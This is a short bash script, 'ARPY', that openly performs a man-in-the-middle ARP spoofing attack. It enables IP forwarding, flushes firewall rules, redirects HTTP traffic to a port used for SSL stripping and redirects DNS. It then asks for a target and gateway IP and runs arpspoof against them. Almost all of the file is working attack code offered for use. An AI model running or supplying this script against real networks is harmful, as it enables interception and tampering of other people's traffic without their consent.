#!/bin/bash/

scriptName=arpspoof.sh
#----------------------------------------------------
echo "       ______   _________  ________  ____ ___"
echo "     _/     /  /        / /       / / __// _/"
echo "    /   _/  / /   _/   _//   _/  _// / _/ / "
echo "   /       / /  __   _/ /   ____/ /   ___/ "
echo "  /   /   / /  / /  /  /   /     /   / " 
echo " /   /   / /  / /  /_ /   /     /   /  "
echo "/____/___//___//____//____/    /____/      "
#--------------------------------------------------
sleep 2
echo
echo "MONITOR MODE is NOT necessary"
sleep 1
echo "Created on 29/07/2017 by Marc Pascual i Solé. Mail me at mpasole@protonmail.com"
sleep 1.3
echo "Last Modification:" $(stat $HOME/Documents/unix_scripts/$scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
sleep 1
echo
echo "___________________________________________"
echo
echo "		Welcome To ARPY"
echo "___________________________________________"
echo
sleep 3
echo "This Program is designed to permorm a MIM arpspoofing attack"
sleep 1

echo
sleep 0.5
################ PROGRAM ################################
# This will allow ip forwarding acting like a VPN:
echo "[+] Changing Firewall rules..."
echo "[+] Enabling Ip Forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 1
echo -n "[+] Ip forwarding is now set to "
cat /proc/sys/net/ipv4/ip_forward && echo
sleep 0.5
echo "[+] Flushing existing iptables rules"
iptables --flush
iptables --flush -t nat
sleep 3
echo "[+] Redirecting port 80 to port 8080"
#This will redirect the HTTP/S traffic to the SSL strip port 
iptables -t nat -I  PREROUTING 1 -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sleep 3
echo "[+] Redirecting udp port 53"
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
#Enable the port 8080 to accept tcp traffic
echo "[+] Changing port 8080 permissions"
sleep
iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT

echo "Done..."
sleep 2

#USER INPUT:
echo -n "[*] Target IP: "
read dTarget
sleep 0.2
echo -n "[*] Gateway IP: "
read dRouter
sleep 0.2&&echo&&sleep 1&&echo "[START] Beggining the arpspoof attack..."

#ATTACK:
# open a new terminal with sudo -i gnome-terminal and type tail -f <logFile>
 
arpspoof -i wlp2s0  $dRouter -t $dTarget  
